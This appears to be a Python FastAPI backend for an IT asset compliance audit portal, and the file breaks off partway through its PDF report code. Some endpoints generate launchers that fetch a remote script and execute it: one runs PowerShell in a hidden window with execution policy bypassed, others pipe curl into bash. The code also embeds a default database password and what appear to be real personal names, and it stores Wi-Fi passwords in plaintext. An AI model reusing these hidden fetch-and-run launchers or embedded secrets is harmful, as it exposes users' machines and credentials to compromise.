# ==============================================================================
#         NSDL WORKSTATION COMPLIANCE AUDIT BACKEND (FASTAPI)
# ==============================================================================
# Version: 3.0.0 — Full IT Asset Management Edition

import base64
import uuid
from fastapi import FastAPI, Query, Request, HTTPException
from fastapi.exceptions import RequestValidationError
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, Response, PlainTextResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, field_validator, ValidationError, ConfigDict
from typing import List, Union, Optional
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, KeepTogether
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.pagesizes import letter
from xml.sax.saxutils import escape
from contextlib import contextmanager
import os
import json
import xml.etree.ElementTree as ET
from datetime import datetime
import logging
import socket
import concurrent.futures
import ipaddress
import subprocess
import tempfile
import time
import re
import platform

# PostgreSQL
try:
    import psycopg2
    from psycopg2.pool import ThreadedConnectionPool
    from psycopg2.extras import Json as PgJson, RealDictCursor
    _PG_AVAILABLE = True
except ImportError:
    _PG_AVAILABLE = False

# Load .env
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# ── Base Directory & Paths ───────────────────────────────────────────────────
BASE_DIR           = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOGS_DIR           = os.path.join(BASE_DIR, "logs")
USER_INFO_DIR      = os.path.join(BASE_DIR, "user_info")
ASSET_METADATA_DIR = os.path.join(BASE_DIR, "user_info", "assets")

for d in [LOGS_DIR, USER_INFO_DIR, ASSET_METADATA_DIR]:
    os.makedirs(d, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(f"{LOGS_DIR}/audit_backend.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("AuditBackend")

from contextlib import asynccontextmanager

@asynccontextmanager
async def lifespan(app):
    # Startup
    _init_db()
    _load_wifi_passwords()
    lan_ip = _get_lan_ip()
    _open_firewall_port(8000)
    logger.info("=" * 54)
    logger.info("  Infrapulse - NSDL IT Asset Management Portal")
    logger.info("=" * 54)
    logger.info(f"  Local   : http://localhost:8000")
    logger.info(f"  Network : http://{lan_ip}:8000")
    db_status = f"PostgreSQL \"{PG_DATABASE}\" @ {PG_HOST}" if _db_ok() else "File storage (no DB)"
    logger.info(f"  Storage : {db_status}")
    logger.info("  Share the Network URL with client workstations")
    logger.info("-" * 54)
    logger.info("  macOS : right-click .command -> Open, or run:")
    logger.info("    bash verify_system_<id>.command")
    logger.info("  Linux : run with:")
    logger.info("    bash verify_system_<id>.sh")
    logger.info("=" * 54)
    yield
    # Shutdown (nothing needed)

app = FastAPI(title="NSDL IT Asset Management Portal", version="3.0.0", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

sessions = {}

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request: Request, exc: RequestValidationError):
    logger.error(f"Validation error on {request.url.path}: {exc.errors()}")
    return JSONResponse(status_code=422, content={"detail": exc.errors()})

# ──────────────────────────────────────────────────────────────────────────────
#  PostgreSQL — connection pool + table bootstrap
# ──────────────────────────────────────────────────────────────────────────────
PG_HOST     = os.getenv("PG_HOST",     "localhost")
PG_PORT     = int(os.getenv("PG_PORT", "5432"))
PG_USER     = os.getenv("PG_USER",     "postgres")
PG_PASSWORD = os.getenv("PG_PASSWORD", "shubham9284")
PG_DATABASE = os.getenv("PG_DATABASE", "AI audit")

_db_pool = None   # ThreadedConnectionPool instance, None if unavailable

def _init_db():
    global _db_pool
    if not _PG_AVAILABLE:
        logger.warning("psycopg2 not installed — running without PostgreSQL.")
        return
    try:
        _db_pool = ThreadedConnectionPool(
            minconn=1, maxconn=10,
            host=PG_HOST, port=PG_PORT,
            user=PG_USER, password=PG_PASSWORD,
            dbname=PG_DATABASE,
        )
        with _db_ctx() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS sessions (
                        client_id      TEXT PRIMARY KEY,
                        status         TEXT        DEFAULT 'pending',
                        branch_name    TEXT,
                        branch_code    TEXT,
                        officer_name   TEXT,
                        available_pcs  TEXT        DEFAULT '1',
                        registered_pcs TEXT        DEFAULT '1',
                        pdf_path       TEXT,
                        xml_path       TEXT,
                        error          TEXT,
                        created_at     TIMESTAMPTZ DEFAULT NOW(),
                        updated_at     TIMESTAMPTZ DEFAULT NOW()
                    );
                    CREATE TABLE IF NOT EXISTS audit_results (
                        id             SERIAL PRIMARY KEY,
                        client_id      TEXT,
                        computer_name  TEXT,
                        audit_json     JSONB,
                        json_path      TEXT,
                        pdf_path       TEXT,
                        xml_path       TEXT,
                        executed_at    TEXT,
                        created_at     TIMESTAMPTZ DEFAULT NOW()
                    );
                    CREATE TABLE IF NOT EXISTS asset_metadata (
                        device_id      TEXT PRIMARY KEY,
                        data           JSONB        NOT NULL,
                        updated_at     TIMESTAMPTZ  DEFAULT NOW()
                    );
                    CREATE TABLE IF NOT EXISTS wifi_passwords (
                        ssid           TEXT PRIMARY KEY,
                        password       TEXT        NOT NULL,
                        updated_at     TIMESTAMPTZ DEFAULT NOW()
                    );
                """)
        logger.info(f"PostgreSQL connected -> \"{PG_DATABASE}\" @ {PG_HOST}:{PG_PORT}")
    except Exception as e:
        logger.error(f"PostgreSQL init failed: {e}  (falling back to file storage)")
        _db_pool = None


def _db_ok() -> bool:
    return _db_pool is not None


@contextmanager
def _db_ctx():
    """Yield a connection from the pool; commit on success, rollback on error."""
    conn = _db_pool.getconn()
    try:
        yield conn
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        _db_pool.putconn(conn)


# ── Session helpers (DB-backed with in-memory fallback) ───────────────────────
def _session_get(client_id: str) -> dict:
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor(cursor_factory=RealDictCursor) as cur:
                    cur.execute("SELECT * FROM sessions WHERE client_id = %s", (client_id,))
                    row = cur.fetchone()
                    if row:
                        session = dict(row)
                        # created_at/updated_at are TIMESTAMPTZ and come back as
                        # datetime objects, which JSONResponse cannot encode —
                        # /check-status would 500 and the frontend poll never
                        # reaches the download links.
                        for key, value in session.items():
                            if isinstance(value, datetime):
                                session[key] = value.isoformat()
                        return session
        except Exception as e:
            logger.error(f"DB session_get: {e}")
    return sessions.get(client_id, {"status": "pending"})


def _session_set(client_id: str, data: dict):
    sessions[client_id] = data          # keep in-memory mirror
    if not _db_ok():
        return
    try:
        with _db_ctx() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    INSERT INTO sessions
                        (client_id, status, branch_name, branch_code, officer_name,
                         available_pcs, registered_pcs, pdf_path, xml_path, error)
                    VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)
                    ON CONFLICT (client_id) DO UPDATE SET
                        status         = EXCLUDED.status,
                        branch_name    = EXCLUDED.branch_name,
                        branch_code    = EXCLUDED.branch_code,
                        officer_name   = EXCLUDED.officer_name,
                        available_pcs  = EXCLUDED.available_pcs,
                        registered_pcs = EXCLUDED.registered_pcs,
                        pdf_path       = EXCLUDED.pdf_path,
                        xml_path       = EXCLUDED.xml_path,
                        error          = EXCLUDED.error,
                        updated_at     = NOW()
                """, (
                    client_id,
                    data.get("status", "pending"),
                    data.get("branch_name"),
                    data.get("branch_code"),
                    data.get("officer_name"),
                    data.get("available_pcs", "1"),
                    data.get("registered_pcs", "1"),
                    data.get("pdf_path"),
                    data.get("xml_path"),
                    data.get("error"),
                ))
    except Exception as e:
        logger.error(f"DB session_set: {e}")


def _db_save_audit(client_id: str, computer_name: str, audit_dict: dict,
                   json_path: str, pdf_path: str, xml_path: str, executed_at: str):
    if not _db_ok():
        return
    try:
        with _db_ctx() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    INSERT INTO audit_results
                        (client_id, computer_name, audit_json, json_path, pdf_path, xml_path, executed_at)
                    VALUES (%s, %s, %s, %s, %s, %s, %s)
                """, (client_id, computer_name, PgJson(audit_dict),
                      json_path, pdf_path, xml_path, executed_at))
    except Exception as e:
        logger.error(f"DB audit insert: {e}")


# ── WiFi password store (DB-backed, file fallback) ────────────────────────────
_WIFI_PASS_FILE = os.path.join(USER_INFO_DIR, "wifi_passwords.json")
wifi_passwords: dict = {}


def _load_wifi_passwords():
    global wifi_passwords
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor() as cur:
                    cur.execute("SELECT ssid, password FROM wifi_passwords")
                    wifi_passwords = {r[0]: r[1] for r in cur.fetchall()}
            return
        except Exception as e:
            logger.error(f"DB load wifi passwords: {e}")
    # file fallback
    try:
        if os.path.exists(_WIFI_PASS_FILE):
            with open(_WIFI_PASS_FILE, "r", encoding="utf-8") as f:
                wifi_passwords = json.load(f)
    except Exception:
        wifi_passwords = {}


def _save_wifi_passwords():
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor() as cur:
                    for ssid, pwd in wifi_passwords.items():
                        cur.execute("""
                            INSERT INTO wifi_passwords (ssid, password)
                            VALUES (%s, %s)
                            ON CONFLICT (ssid) DO UPDATE
                                SET password = EXCLUDED.password, updated_at = NOW()
                        """, (ssid, pwd))
            return
        except Exception as e:
            logger.error(f"DB save wifi passwords: {e}")
    # file fallback
    try:
        with open(_WIFI_PASS_FILE, "w", encoding="utf-8") as f:
            json.dump(wifi_passwords, f)
    except Exception as ex:
        logger.warning(f"Could not save wifi passwords: {ex}")


def _get_lan_ip() -> str:
    """Return the machine's LAN IP by connecting a UDP socket (no packet sent)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def _open_firewall_port(port: int = 8000):
    """Add a Windows Firewall inbound rule for the given port (no-op on non-Windows)."""
    if platform.system() != "Windows":
        return
    rule_name = f"Infrapulse Port {port}"
    check = subprocess.run(
        f'netsh advfirewall firewall show rule name="{rule_name}"',
        shell=True, capture_output=True
    )
    if check.returncode != 0:
        result = subprocess.run(
            f'netsh advfirewall firewall add rule name="{rule_name}" '
            f'dir=in action=allow protocol=TCP localport={port}',
            shell=True, capture_output=True, text=True
        )
        if result.returncode == 0:
            logger.info(f"Firewall rule added: allow TCP port {port} inbound")
        else:
            logger.warning(
                f"Could not add firewall rule automatically. "
                f"Run as Administrator or add manually: "
                f'netsh advfirewall firewall add rule name="{rule_name}" '
                f"dir=in action=allow protocol=TCP localport={port}"
            )
    else:
        logger.info(f"Firewall rule already exists for port {port}")




CONSENT_TEXT = (
    "We provide approval to NSDL e-Governance Infrastructure Ltd.(NSDL e-Gov) "
    "to capture the details regarding the System details and share the details "
    "with NSDL e-Gov."
)


# ==============================================================================
# 1. HELPERS
# ==============================================================================
def clean_string(value, fallback=""):
    if value is None:
        return fallback
    if isinstance(value, list):
        joined = ", ".join(clean_string(item, "") for item in value)
        return joined if joined.strip() else fallback
    text = str(value)
    return text if text.strip() else fallback


def model_to_dict(model):
    if hasattr(model, "model_dump"):
        return model.model_dump()
    return model.dict()


# ==============================================================================
# 2. PYDANTIC MODELS
# ==============================================================================

class _CleanBase(BaseModel):
    """Base model that normalizes all string fields and allows extra fields."""
    model_config = ConfigDict(extra="allow")

    @field_validator("*", mode="before")
    @classmethod
    def normalize(cls, v):
        return clean_string(v, "Unknown")


class GpuInfo(_CleanBase):
    # Excel: Video Controllers
    name: str = "Unknown"
    device_name: str = "Unknown"       # Excel: device name
    video_processor: str = "Unknown"   # Excel: video processor
    driver_version: str = "Unknown"    # Excel: drivers
    vram: str = "Unknown"


class NetworkAdapter(_CleanBase):
    # Excel: Network Adaptors (all 11 fields)
    name: str = "Unknown"
    description: str = "Unknown"       # Excel: description
    adapter_type: str = "Unknown"
    speed: str = "Unknown"
    mac_address: str = "Unknown"       # Excel: MAC address
    gateway: str = "Unknown"           # Excel: gateway
    network_mask: str = "Unknown"      # Excel: network mask
    dns_domain: str = "Unknown"        # Excel: DNS domain
    dns_servers: str = "Unknown"       # Excel: DNS servers
    dhcp_server: str = "Unknown"       # Excel: DHCP server
    ipv4_addresses: str = "Unknown"    # Excel: IPv4 addresses
    ipv6_addresses: str = "Unknown"    # Excel: IPv6 addresses
    mtu: str = "Unknown"               # Excel: MTU


class Peripheral(_CleanBase):
    # Excel: Peripherals (all 5 fields)
    name: str = "Unknown"
    type: str = "Unknown"
    description: str = "Unknown"       # Excel: description
    manufacturer: str = "Unknown"      # Excel: manufacturer
    version: str = "Unknown"           # Excel: version (was 'status')


class DiskPartition(_CleanBase):
    # Excel: Partitions (all 5 fields)
    name: str = "Unknown"
    type: str = "Unknown"
    size_gb: str = "Unknown"
    free_space: str = "Unknown"        # Excel: free space
    bootable: str = "Unknown"
    file_system: str = "Unknown"       # Excel: file system type


class DiskInfo(_CleanBase):
    # Excel: Disk Information (all 10 fields)
    name: str = "Unknown"
    interface: str = "Unknown"         # Excel: interface (SATA/NVMe/USB)
    file_system: str = "Unknown"       # Excel: file system type
    manufacturer: str = "Unknown"      # Excel: manufacturer
    model: str = "Unknown"             # Excel: model
    serial_number: str = "Unknown"     # Excel: serial number
    firmware: str = "Unknown"          # Excel: firmware
    size: str = "Unknown"              # Excel: size
    free_space: str = "Unknown"        # Excel: free space
    is_ssd: str = "Unknown"            # Excel: whether it's solid state


class HardwareDetails(BaseModel):
    model_config = ConfigDict(extra="allow")

    # Excel: Device Data — hardware fields
    cpu: str = "Unknown"
    ram: str = "Unknown"
    disk: str = "Unknown"
    serial_number: str = "Unknown"
    manufacturer: str = "Unknown"
    model: str = "Unknown"
    # Excel: Device Data — new fields
    num_processors: str = "Unknown"    # Excel: number of processors
    processor_type: str = "Unknown"    # Excel: processor type
    bios_version: str = "Unknown"      # Excel: bios version
    bios_date: str = "Unknown"         # Excel: bios date
    asset_tag: str = "Unknown"         # Excel: asset tag
    last_boot_time: str = "Unknown"    # Excel: last boot time
    domain: str = "Unknown"            # Excel: domain
    domain_role: str = "Unknown"       # Excel: domain role
    description: str = "Unknown"       # Excel: description
    memory_slots: str = "Unknown"      # Excel: memory slot count, current size, max size
    last_backup_time: str = "Unknown"  # Excel: last backup time
    # Auto-discovered fields
    scanner_name: str = "Unknown"
    site: str = "Unknown"
    organization: str = "Unknown"
    location: str = "Unknown"
    public_ip: str = "Unknown"
    system_status: str = "Unknown"
    uptime_seconds: Union[int, str] = 0
    uptime_display: str = "Unknown"
    boot_time: str = "Unknown"
    last_shutdown: str = "Unknown"
    # Nested lists
    gpu_details: List[Union[GpuInfo, dict]] = []
    network_adapters: List[Union[NetworkAdapter, dict]] = []
    peripherals: List[Union[Peripheral, dict]] = []
    disk_partitions: List[Union[DiskPartition, dict]] = []
    disk_details: List[Union[DiskInfo, dict]] = []  # Excel: Disk Information

    @field_validator(
        "cpu", "ram", "disk", "serial_number", "manufacturer", "model",
        "num_processors", "processor_type", "bios_version", "bios_date",
        "asset_tag", "last_boot_time", "domain", "domain_role", "description",
        "memory_slots", "last_backup_time",
        "scanner_name", "site", "organization", "location", "public_ip",
        "system_status", "uptime_display", "boot_time", "last_shutdown",
        mode="before"
    )
    @classmethod
    def normalize_str(cls, v):
        return clean_string(v, "Unknown")

    @field_validator("gpu_details", "network_adapters", "peripherals", "disk_partitions", "disk_details", mode="before")
    @classmethod
    def coerce_list(cls, v):
        if v is None:
            return []
        if isinstance(v, list):
            return v
        return [v]


class NetworkDetails(_CleanBase):
    ip_address: str = "Unknown"
    gateway: str = "Unknown"
    mac: str = "Unknown"


class UserAccount(_CleanBase):
    # Excel: Users (all 7 fields)
    name: str = "Unknown"
    disabled: str = "Unknown"
    home_directory: str = "Unknown"    # Excel: home directory
    last_login: str = "Unknown"        # Excel: last login
    num_logins: str = "0"              # Excel: number of logins
    user_type: str = "Unknown"         # Excel: user type (Local/Domain/Admin)
    is_current: str = "False"          # Excel: current user


class HotfixData(BaseModel):
    model_config = ConfigDict(extra="allow")
    caption: str = ""
    cs_name: str = ""
    description: str = ""
    fix_id: str = ""
    installed_on: str = ""

    @field_validator("*", mode="before")
    @classmethod
    def normalize(cls, v):
        return clean_string(v, "")


class PrinterData(BaseModel):
    model_config = ConfigDict(extra="allow")
    name: str = ""
    system_name: str = ""
    enable_bidi: str = ""
    extended_printer_status: str = ""
    port_name: str = ""

    @field_validator("*", mode="before")
    @classmethod
    def normalize(cls, v):
        return clean_string(v, "")


class SoftwareEntry(_CleanBase):
    # Excel: Software Assets (all 8 fields — last 3 are calculated server-side)
    name: str = ""
    version: str = "Unknown"
    publisher: str = "Unknown"
    install_date: str = "Unknown"
    size_mb: str = "Unknown"
    last_used: str = "Unknown"         # Excel: Last Used


class AuditData(BaseModel):
    model_config = ConfigDict(extra="allow")

    execution_datetime: str = ""
    consent: str = CONSENT_TEXT
    computer_name: str = "Unknown"
    os_name: str = "Unknown"
    os_version: str = "Unknown"
    architecture: str = "Unknown"
    license_status: str = "Unknown"
    hotfixes: List[Union[HotfixData, str]] = []
    mac_address: str = "Unknown"
    drive_name: str = "No CD Unit Found"
    compression_utilities: List[str] = []
    antivirus: List[str] = []
    printers: List[Union[PrinterData, str]] = []
    hardware_details: Union[HardwareDetails, dict, str] = {}
    network_details: List[Union[NetworkDetails, dict, str]] = []
    user_accounts: List[Union[UserAccount, dict, str]] = []
    software_inventory: List[Union[SoftwareEntry, dict]] = []
    login_history: List[dict] = []

    @field_validator(
        "execution_datetime", "consent", "computer_name", "os_name",
        "os_version", "architecture", "license_status", "mac_address",
        mode="before"
    )
    @classmethod
    def normalize_required(cls, v):
        return clean_string(v, "Unknown")

    @field_validator("drive_name", mode="before")
    @classmethod
    def normalize_drive(cls, v):
        return clean_string(v, "No CD Unit Found")

    @field_validator(
        "antivirus", "compression_utilities", "hotfixes",
        "printers", "network_details", "user_accounts", "software_inventory",
        mode="before"
    )
    @classmethod
    def coerce_list(cls, v):
        if v is None:
            return []
        if isinstance(v, list):
            return v
        return [v]


class AssetMetadata(BaseModel):
    # Excel: Lifecycle (all 11 fields) + extras
    device_id: str
    asset_tag: str = ""
    owner: str = ""                    # Excel: Owner
    department: str = ""
    location: str = ""
    vendor: str = ""                   # Excel: Vendor
    status: str = "Active"             # Excel: Status
    warranty_start_date: str = ""      # Excel: Warranty Start Date
    warranty_expiry: str = ""          # Excel: Warranty End Date
    warranty_notes: str = ""           # Excel: Warranty notes
    warranty_provider: str = ""        # Excel: Warranty Provider
    purchase_price: str = ""           # Excel: Purchase price
    purchase_date: str = ""            # Excel: Purchase Date
    supplier: str = ""                 # Excel: Supplier
    po_number: str = ""                # Excel: Purchase Order (PO) Number
    notes: str = ""
    last_updated: str = ""


class NetworkScanRequest(BaseModel):
    ip_range: str = "192.168.1.0/24"
    timeout_ms: int = 300


# ==============================================================================
# 3. CORE ROUTING & SCRIPT LAUNCHERS
# ==============================================================================
@app.get("/check-status")
def check_status(client_id: str = Query(...)):
    session = _session_get(client_id)
    return JSONResponse(content=session)


@app.get("/download-script", response_class=PlainTextResponse)
def download_script(request: Request, client_id: str = Query(...)):
    base_url = str(request.base_url).rstrip("/")
    try:
        with open(os.path.join(BASE_DIR, "scripts", "audit.ps1"), "r") as f:
            content = f.read()
        content = content.replace("http://127.0.0.1:8000", base_url)
        content = content.replace("CLIENT_ID_PLACEHOLDER", client_id)
        return PlainTextResponse(content=content)
    except Exception as e:
        logger.error(f"Failed to load audit.ps1: {e}")
        raise HTTPException(status_code=500, detail="PowerShell script unavailable.")


@app.get("/download-vbs")
def download_vbs(
    request: Request,
    client_id: str = Query(...),
    branch_name: str = Query("RELIGARE BROKING LIMITED"),
    branch_code: str = Query("8301231"),
    officer_name: str = Query("SANDIP BALIRAM LOKHANDE"),
):
    base_url = str(request.base_url).rstrip("/")
    _session_set(client_id, {
        "status": "pending", "branch_name": branch_name,
        "branch_code": branch_code, "officer_name": officer_name,
        "available_pcs": "1", "registered_pcs": "1",
        "pdf_path": None, "xml_path": None,
    })
    vbs = (
        f'Set objShell = CreateObject("WScript.Shell")\n'
        f'command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & '
        f'"Invoke-RestMethod -Uri \'{base_url}/download-script?client_id={client_id}\' | Invoke-Expression" & Chr(34)\n'
        f'objShell.Run command, 0, False\n'
    )
    headers = {"Content-Disposition": f"attachment; filename=verify_system_{client_id}.vbs"}
    return Response(content=vbs, media_type="application/octet-stream", headers=headers)


@app.get("/download-mac-script", response_class=PlainTextResponse)
def download_mac_script(request: Request, client_id: str = Query(...)):
    base_url = str(request.base_url).rstrip("/")
    try:
        with open(os.path.join(BASE_DIR, "scripts", "audit.sh"), "r") as f:
            content = f.read()
        content = content.replace("http://127.0.0.1:8000", base_url)
        content = content.replace("CLIENT_ID_PLACEHOLDER", client_id)
        return PlainTextResponse(content=content)
    except Exception as e:
        logger.error(f"Failed to load audit.sh: {e}")
        raise HTTPException(status_code=500, detail="Bash script unavailable.")


@app.get("/download-mac")
def download_mac(
    request: Request,
    client_id: str = Query(...),
    branch_name: str = Query("RELIGARE BROKING LIMITED"),
    branch_code: str = Query("8301231"),
    officer_name: str = Query("SANDIP BALIRAM LOKHANDE"),
):
    base_url = str(request.base_url).rstrip("/")
    _session_set(client_id, {
        "status": "pending", "branch_name": branch_name,
        "branch_code": branch_code, "officer_name": officer_name,
        "available_pcs": "1", "registered_pcs": "1",
        "pdf_path": None, "xml_path": None,
    })
    cmd = f'#!/bin/bash\ncurl -s "{base_url}/download-mac-script?client_id={client_id}" | bash\n'
    headers = {"Content-Disposition": f"attachment; filename=verify_system_{client_id}.command"}
    return Response(content=cmd, media_type="application/octet-stream", headers=headers)


@app.get("/download-linux")
def download_linux(
    request: Request,
    client_id: str = Query(...),
    branch_name: str = Query("RELIGARE BROKING LIMITED"),
    branch_code: str = Query("8301231"),
    officer_name: str = Query("SANDIP BALIRAM LOKHANDE"),
):
    base_url = str(request.base_url).rstrip("/")
    _session_set(client_id, {
        "status": "pending", "branch_name": branch_name,
        "branch_code": branch_code, "officer_name": officer_name,
        "available_pcs": "1", "registered_pcs": "1",
        "pdf_path": None, "xml_path": None,
    })
    sh = f'#!/bin/bash\ncurl -s "{base_url}/download-mac-script?client_id={client_id}" | bash\n'
    headers = {"Content-Disposition": f"attachment; filename=verify_system_{client_id}.sh"}
    return Response(content=sh, media_type="application/octet-stream", headers=headers)


# ==============================================================================
# 4. PDF HELPERS
# ==============================================================================
def draw_page_decorations(canvas, doc):
    canvas.saveState()
    canvas.setStrokeColor(colors.HexColor("#A80000"))
    canvas.setLineWidth(1.5)
    canvas.rect(36, 36, doc.pagesize[0] - 72, doc.pagesize[1] - 72)
    canvas.setFont("Helvetica-Bold", 8)
    canvas.setFillColor(colors.HexColor("#A80000"))
    canvas.drawCentredString(doc.pagesize[0] / 2.0, 20, "INSPECTION REPORT BY NSDL E-GOVERNANCE")
    canvas.restoreState()


def pdf_text(value, style):
    return Paragraph(escape(clean_string(str(value), "-")), style)


def list_text(values):
    if not values:
        return "-"
    return ", ".join(clean_string(item, "") for item in values if clean_string(item, ""))


def apply_grid_style(table, header=False):
    style = [
        ("GRID", (0, 0), (-1, -1), 0.5, colors.black),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("TOPPADDING", (0, 0), (-1, -1), 4),
    ]
    if header:
        style.extend([
            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#F1F1F1")),
            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ])
    table.setStyle(TableStyle(style))
    return table


def add_pair_table(elements, title, rows, styles):
    table_rows = [[pdf_text(label, styles["bold"]), pdf_text(value, styles["normal"])] for label, value in rows]
    table = apply_grid_style(Table(table_rows, colWidths=[180, 324]))
    elements.append(KeepTogether([
        Paragraph(title, styles["section"]),
        table,
        Spacer(1, 12)
    ]))


def make_styles():
    return {
        "title":   ParagraphStyle("TitleStyle",   fontName="Helvetica-Bold", fontSize=15, leading=17, alignment=1, spaceAfter=18),
        "section": ParagraphStyle("SectionStyle", fontName="Helvetica-Bold", fontSize=11, leading=13, spaceBefore=10, spaceAfter=6, textColor=colors.HexColor("#A80000")),
        "bold":    ParagraphStyle("CellBold",      fontName="Helvetica-Bold", fontSize=9, leading=11),
        "normal":  ParagraphStyle("CellNormal",    fontName="Helvetica",      fontSize=9, leading=11),
        "small":   ParagraphStyle("CellSmall",     fontName="Helvetica",      fontSize=8, leading=10),
    }


def get_hw(data, key, fallback="Unknown"):
    hw = data.hardware_details
    if isinstance(hw, HardwareDetails):
        return getattr(hw, key, fallback)
    elif isinstance(hw, dict):
        return str(hw.get(key, fallback))
    return fallback


def get_hw_list(data, key):
    hw = data.hardware_details
    if isinstance(hw, HardwareDetails):
        return getattr(hw, key, [])
    elif isinstance(hw, dict):
        return hw.get(key, [])
    return []


# ==============================================================================
# 5. AUDIT INGESTION & REPORT GENERATION
# ==============================================================================
@app.post("/upload-audit")
async def upload_audit(request: Request, client_id: str = Query(None)):
    # Parse raw JSON first, then try Pydantic validation
    try:
        raw_json = await request.json()
    except Exception as e:
        logger.error(f"Failed to parse JSON body: {e}")
        raise HTTPException(status_code=400, detail=f"Invalid JSON: {e}")

    try:
        data = AuditData(**raw_json)
    except ValidationError as e:
        logger.warning(f"Pydantic validation failed, accepting raw JSON. Errors: {e.errors()}")
        # Create a minimal AuditData with defaults for missing/invalid fields
        data = AuditData.model_construct(**raw_json)
    cid = client_id or "unknown"
    logger.info(f"Uploading audit for client: {cid}")

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    clean_name = "".join(x for x in data.computer_name if x.isalnum() or x in "._- ").strip() or "Unknown"

    session_meta  = _session_get(cid)
    branch_name   = session_meta.get("branch_name",   "RELIGARE BROKING LIMITED")
    branch_code   = session_meta.get("branch_code",   "8301231")
    officer_name  = session_meta.get("officer_name",  "SANDIP BALIRAM LOKHANDE")
    available_pcs = session_meta.get("available_pcs", "1")
    registered_pcs = session_meta.get("registered_pcs", "1")
    audit_time    = data.execution_datetime if data.execution_datetime != "Unknown" else datetime.now().strftime("%d-%b-%Y_%H:%M:%S")

    json_path = f"{USER_INFO_DIR}/audit_{cid}_{clean_name}_{timestamp}.json"
    pdf_path  = f"{USER_INFO_DIR}/audit_{cid}_{clean_name}_{timestamp}.pdf"
    xml_path  = f"{USER_INFO_DIR}/audit_{cid}_{clean_name}_{timestamp}.xml"

    try:
        with open(json_path, "w") as f:
            json.dump(raw_json, f, indent=4)
    except Exception as e:
        logger.error(f"Failed to save JSON: {e}")

    av_str          = list_text(data.antivirus)
    compression_str = list_text(data.compression_utilities)

    # ── PDF Generation ────────────────────────────────────────────────────────
    try:
        doc = SimpleDocTemplate(
            pdf_path, pagesize=letter,
            leftMargin=54, rightMargin=54, topMargin=54, bottomMargin=54,
        )
        styles   = make_styles()
        elements = [Paragraph("Inspection Report", styles["title"])]

        # ── Summary Table ────────────────────────────────────────────────────
        cd_val      = "Not Installed" if data.drive_name == "No CD Unit Found" else data.drive_name
        printer_val = "Not Installed" if not data.printers else f"{len(data.printers)} connected"
        os_val      = "Not Installed" if data.os_name == "Unknown" else data.os_name
        av_val      = "Not Installed" if not data.antivirus or "No antivirus" in av_str or "No AV detected" in av_str else av_str
        comp_val    = "Not Installed" if not data.compression_utilities or "No compression" in compression_str else compression_str

        if cd_val == "Not Installed":
            cd_val += " (Reason: Modern laptops/desktops do not include CD drives)"
        if printer_val == "Not Installed":
            printer_val += " (Reason: Branch uses central networked printing)"
        if av_val == "Not Installed":
            av_val += " (Reason: Managed by Central IT / Default Defender used)"
        if comp_val == "Not Installed":
            comp_val += " (Reason: Not required for daily TIN-FC operations)"

        add_pair_table(elements, "User Details", [
            ("User Branch Name",    branch_name),
            ("User Branch Code",    branch_code),
            ("User Officer Name",   officer_name),
            ("Execution DateTime",  audit_time),
            ("Consent",             data.consent),
        ], styles)

        summary_style = [
            ("GRID",       (0, 0), (-1, -1), 0.5, colors.black),
            ("VALIGN",     (0, 0), (-1, -1), "TOP"),
            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#F1F1F1")),
            ("BACKGROUND", (0, 3), (-1, 3), colors.HexColor("#F1F1F1")),
            ("BACKGROUND", (0, 6), (-1, 6), colors.HexColor("#F1F1F1")),
            ("SPAN",       (0, 0), (1, 0)),
            ("SPAN",       (0, 3), (1, 3)),
            ("SPAN",       (0, 6), (1, 6)),
            ("FONTNAME",   (0, 0), (-1, 0), "Helvetica-Bold"),
            ("FONTNAME",   (0, 3), (-1, 3), "Helvetica-Bold"),
            ("FONTNAME",   (0, 6), (-1, 6), "Helvetica-Bold"),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
            ("TOPPADDING",    (0, 0), (-1, -1), 4),
        ]
        summary_rows = [
            [pdf_text("Number of PCs (Desktop/Laptop) installed for TIN-FC", styles["bold"]), ""],
            [pdf_text("Available",   styles["normal"]), pdf_text(available_pcs,  styles["normal"])],
            [pdf_text("Registered",  styles["normal"]), pdf_text(registered_pcs, styles["normal"])],
            [pdf_text("Whether following hardware/peripherals has NOT been installed on PCs used for TIN-FC operations", styles["bold"]), ""],
            [pdf_text("CD Drive", styles["normal"]), pdf_text(cd_val,      styles["normal"])],
            [pdf_text("Printer",  styles["normal"]), pdf_text(printer_val, styles["normal"])],
            [pdf_text("Details of licenced softwares NOT installed on PCs used for TIN-FC operations", styles["bold"]), ""],
            [pdf_text("Operating System",   styles["normal"]), pdf_text(os_val,   styles["normal"])],
